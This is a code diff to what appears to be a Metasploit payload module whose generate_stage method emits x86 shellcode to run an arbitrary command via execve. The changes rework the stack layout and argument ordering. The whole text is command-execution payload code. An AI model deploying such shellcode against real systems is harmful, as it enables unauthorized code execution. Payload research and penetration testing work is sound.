@@ -46,27 +46,20 @@ module Metasploit3
 	#
 	def generate_stage
 		cmd_str   = datastore['CMD'] || ''
-
 		# Split the cmd string into arg chunks
 		cmd_parts = cmd_str.split(/[\s]+/)
+		# the non-exe-path parts of the chunks need to be reversed for execve
+		cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
 		arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
-		arg_len = arg_str.length
 
-		# Stuff an array of arg strings into memory, then copy them all on to the stack
+		# Stuff an array of arg strings into memory
 		payload = ''
 		payload << "\x31\xc0"                         # XOR EAX, EAX  (eax => 0)
-		payload << "\x50"                             # PUSH EAX
-		payload << Rex::Arch::X86.call(arg_len)       # JMPs over CMD_STR, stores &CMD_STR on stack     
+		payload << Rex::Arch::X86.call(arg_str.length) # JMPs over CMD_STR, stores &CMD_STR on stack
 		payload << arg_str
-		payload << "\x5e"                             # POP ESI (ESI = &CMD)
-		payload << "\x89\xe7"                         # MOV EDI, ESP
-		payload << "\xb9"                             # MOV ECX ...
-		payload << [arg_len].pack('V')
-		payload << "\xfc"                             # CLD
-		payload << "\xf2\xa4"                         # REPNE MOVSB  (copies string on to stack)
-		payload << "\x89\xe3"                         # MOV EBX, ESP     (puts ref to copied str in EBX)
+		payload << "\x5B"                             # POP EBX (EBX => &CMD)
 
-		# now EBX contains &cmd_parts[0], the exe path (after it has been copied to the stack)
+		# now EBX contains &cmd_parts[0], the exe path
 		if cmd_parts.length > 1
 			# Build an array of pointers to the arguments we copied on to the stack
 			payload << "\x89\xD9"                     # MOV ECX, EBX
@@ -75,7 +68,7 @@ module Metasploit3
 			cmd_parts[1..-1].each_with_index do |arg, idx|
 				# can probably save space here by doing the loop in ASM
 				# for each arg, push its current memory location on to the stack
-				payload << "\x81\xC1"                 # ADD ECX, + len of previous arg
+				payload << "\x81\xC1"                 # ADD ECX, + ...
 				payload << [cmd_parts[idx].length+1].pack('V') # (cmd_parts[idx] is the prev arg)
 				payload << "\x51"                     # PUSH ECX (&cmd_parts[idx])
 			end
